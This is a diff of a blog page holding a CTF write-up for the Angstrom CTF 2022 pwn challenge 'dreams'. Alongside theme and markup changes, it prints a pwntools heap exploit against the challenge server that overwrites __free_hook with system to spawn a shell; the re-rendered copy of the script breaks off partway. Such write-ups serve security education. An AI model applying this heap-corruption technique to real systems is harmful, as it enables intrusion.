@@ -15,26 +15,25 @@
 
 
 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="0x0 IntroductionSometimes I want to just stay in my dreams. I heard this helps: libc.so.6. nc challs.actf.co 31227 Author: JoshDaBosh files: dreams, libc.so.6 0x1 Mitigation12345Arch:     amd64-64-lit">
+    <meta name="description" content="0x0 IntroductionSometimes I want to just stay in my dreams. I heard this helps: libc.so.6. nc challs.actf.co 31227 Author: JoshDaBosh files: dreams, libc.so.6 0x1 MitigationArch:     amd64-64-little R">
 <meta property="og:type" content="website">
 <meta property="og:title" content="[Pwn] dreams [Angstrom CTF 2022]">
 <meta property="og:url" content="http://www.aynakeya.com/ctf-writeup/2022/angstrom/pwn/dreams/index.html">
 <meta property="og:site_name" content="Aynakeya&#39;s Blog">
-<meta property="og:description" content="0x0 IntroductionSometimes I want to just stay in my dreams. I heard this helps: libc.so.6. nc challs.actf.co 31227 Author: JoshDaBosh files: dreams, libc.so.6 0x1 Mitigation12345Arch:     amd64-64-lit">
+<meta property="og:description" content="0x0 IntroductionSometimes I want to just stay in my dreams. I heard this helps: libc.so.6. nc challs.actf.co 31227 Author: JoshDaBosh files: dreams, libc.so.6 0x1 MitigationArch:     amd64-64-little R">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-05-07T07:41:00.000Z">
-<meta property="article:modified_time" content="2022-05-07T07:41:00.000Z">
+<meta property="article:published_time" content="2022-05-06T16:41:00.000Z">
+<meta property="article:modified_time" content="2022-05-06T16:41:00.000Z">
 <meta property="article:author" content="Aynakeya">
 <meta name="twitter:card" content="summary">
 
 
 <link rel="canonical" href="http://www.aynakeya.com/ctf-writeup/2022/angstrom/pwn/dreams/">
-
 
 
 <script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"en","comments":true,"permalink":"http://www.aynakeya.com/ctf-writeup/2022/angstrom/pwn/dreams/index.html","path":"ctf-writeup/2022/angstrom/pwn/dreams/index.html","title":"[Pwn] dreams [Angstrom CTF 2022]"}</script>
@@ -46,6 +45,27 @@
 
 
 
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.0/pangu.umd.js" integrity="sha256-JnmRRnJK7DC6RQJbAJb6AXOM9OmWzS6z8eYultk/48Y=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
 
 
 
@@ -105,25 +125,25 @@
 
 
   <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="Searching..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
-</div>
-
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
     </div>
   </div>
 
@@ -160,7 +180,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives">
-          <span class="site-state-item-count">119</span>
+          <span class="site-state-item-count">120</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -171,7 +191,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags">
-        <span class="site-state-item-count">96</span>
+        <span class="site-state-item-count">98</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -230,7 +250,11 @@
 <p>nc challs.actf.co 31227</p>
 <p>Author: JoshDaBosh</p>
 <p>files: <a href="dreams">dreams</a>, <a href="libc.so.6">libc.so.6</a></p>
-<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><pre class="line-numbers language-none"><code class="language-none">Arch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 <h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>todo</p>
@@ -238,7 +262,84 @@
 <p>using pointer stored in the freed heap, point next heap to of the <code>obj.dreams</code>.</p>
 <p>Then, change one address in <code>obj.dreams</code> to <code>__free_hook</code>. overwrite <code>__free_hook</code> to <code>system</code>.</p>
 <p><code>free(&quot;/bin/sh&quot;)</code> to get shell.</p>
-<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;dreams_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&quot;./ld-2.27.so&quot;)</span></span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,msg)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.R2:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Wait r2 attach&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;challs.actf.co&quot;</span>, <span class="number">31227</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sleep</span>(<span class="params">io,slot,date,dream</span>):</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;this dream? &quot;</span>,<span class="built_in">str</span>(slot).encode())</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;(mm/dd/yy))?&quot;</span>,flat(&#123;<span class="number">0</span>:[date]&#125;,length=<span class="number">0x8</span>,filler=<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;dream about? &quot;</span>,flat(&#123;<span class="number">0</span>:[dream]&#125;,length=<span class="number">0x14</span>,filler=<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sell</span>(<span class="params">io,slot</span>):</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;trading in?&quot;</span>,<span class="built_in">str</span>(slot).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Get out of here.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>(<span class="params">io,slot,date</span>):</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;trouble?&quot;</span>,<span class="built_in">str</span>(slot).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;that &#x27;</span>)</span><br><span class="line">    bs = io.recvuntil(<span class="string">b&#x27;\nDue&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;New date: &quot;</span>,flat(&#123;<span class="number">0</span>:[date]&#125;,length=<span class="number">0x8</span>,filler=<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> bs</span><br><span class="line"></span><br><span class="line">sleep(io,<span class="number">0</span>,<span class="string">&quot;AAAA&quot;</span>,<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line">sleep(io,<span class="number">1</span>,<span class="string">&quot;AAAA&quot;</span>,<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line">sell(io,<span class="number">0</span>)</span><br><span class="line">sell(io,<span class="number">1</span>)</span><br><span class="line">top_pointer = <span class="built_in">int</span>.from_bytes(visit(io,<span class="number">1</span>,exe.symbols[<span class="string">&quot;dreams&quot;</span>]),<span class="string">&quot;little&quot;</span>)</span><br><span class="line">log_print(<span class="string">&quot;top_pointer&quot;</span>,<span class="built_in">hex</span>(top_pointer))</span><br><span class="line">sleep(io,<span class="number">2</span>,exe.got[<span class="string">&quot;printf&quot;</span>]-<span class="number">8</span>,exe.symbols[<span class="string">&quot;MAX_DREAMS&quot;</span>])</span><br><span class="line">sleep(io,<span class="number">3</span>,top_pointer + <span class="number">0x1300</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x14</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>.from_bytes(visit(io,<span class="number">0</span>,<span class="number">0</span>),<span class="string">&quot;little&quot;</span>) - libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">visit(io,<span class="number">1</span>,<span class="number">0x1337</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base_addr&quot;</span>,<span class="built_in">hex</span>(libc.address))</span><br><span class="line">sleep(io,<span class="number">20</span>,<span class="string">&quot;AAAA&quot;</span>, <span class="number">0</span>)</span><br><span class="line">sleep(io,<span class="number">22</span>,<span class="string">&quot;AAAA&quot;</span>,<span class="number">0</span>)</span><br><span class="line">sell(io,<span class="number">20</span>)</span><br><span class="line">sell(io,<span class="number">22</span>)</span><br><span class="line">visit(io,<span class="number">22</span>,exe.symbols[<span class="string">&quot;dreams&quot;</span>])</span><br><span class="line">sleep(io,<span class="number">10</span>, libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>],<span class="number">0</span>)</span><br><span class="line">sleep(io,<span class="number">14</span>, top_pointer + <span class="number">0x1360</span>,<span class="number">0</span>)</span><br><span class="line">visit(io,<span class="number">0</span>,libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">sleep(io,<span class="number">1</span>,<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;trading in?&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"dreams_patched"</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>
+<span class="token comment"># ld = ELF("./ld-2.27.so")</span>
+
+context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exe
+<span class="token comment"># context.log_level = 'DEBUG'</span>
+
+<span class="token keyword">def</span> <span class="token function">log_print</span><span class="token punctuation">(</span><span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> args<span class="token punctuation">.</span>LOCAL<span class="token punctuation">:</span>
+        r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>exe<span class="token punctuation">.</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> args<span class="token punctuation">.</span>R2<span class="token punctuation">:</span>
+            <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Wait r2 attach"</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"challs.actf.co"</span><span class="token punctuation">,</span> <span class="token number">31227</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> r
+
+
+io <span class="token operator">=</span> start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">sleep</span><span class="token punctuation">(</span>io<span class="token punctuation">,</span>slot<span class="token punctuation">,</span>date<span class="token punctuation">,</span>dream<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b">"</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"this dream? "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>slot<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"(mm/dd/yy))?"</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">[</span>date<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">0x8</span><span class="token punctuation">,</span>filler<span class="token operator">=</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"dream about? "</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">[</span>dream<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">0x14</span><span class="token punctuation">,</span>filler<span class="token operator">=</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">sell</span><span class="token punctuation">(</span>io<span class="token punctuation">,</span>slot<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b">"</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"trading in?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>slot<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Get out of here.\n"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">visit</span><span class="token punctuation">(</span>io<span class="token punctuation">,</span>slot<span class="token punctuation">,</span>date<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b">"</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>
+    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"trouble?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>slot<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'that '</span><span class="token punctuation">)</span>
+    bs <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\nDue'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"New date: "</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">[</span>date<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">0x8</span><span class="token punctuation">,</span>filler<span class="token operator">=</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> bs
+
+sleep<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AAAA"</span><span class="token punctuation">,</span><span class="token string">"BBBB"</span><span class="token punctuation">)</span>
+sleep<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"AAAA"</span><span class="token punctuation">,</span><span class="token string">"BBBB"</span><span class="token punctuation">)</span>
+sell<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
+sell<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
+top_pointer <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>visit<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>exe<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"dreams"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"little"</span><span class="token punctuation">)</span>
+log_print<span class="token punctuation">(</span><span class="token string">"top_pointer"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>top_pointer<span class="token punctuation">)</span><span class="token punctuation">)</span>
+sleep<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>exe<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span>exe<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"MAX_DREAMS"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+sleep<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>top_pointer <span class="token operator">+</span> <span class="token number">0x1300</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x14</span><span class="token punctuation">)</span>
+libc<span class="token punctuation">.</span>address <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>visit<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"little"</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>
+visit<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x1337</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_base_addr"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
+sleep<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token string">"AAAA"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
+sleep<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token string">"AAAA"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
+sell<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span>
+sell<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">)</span>
+visit<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span>exe<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"dreams"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
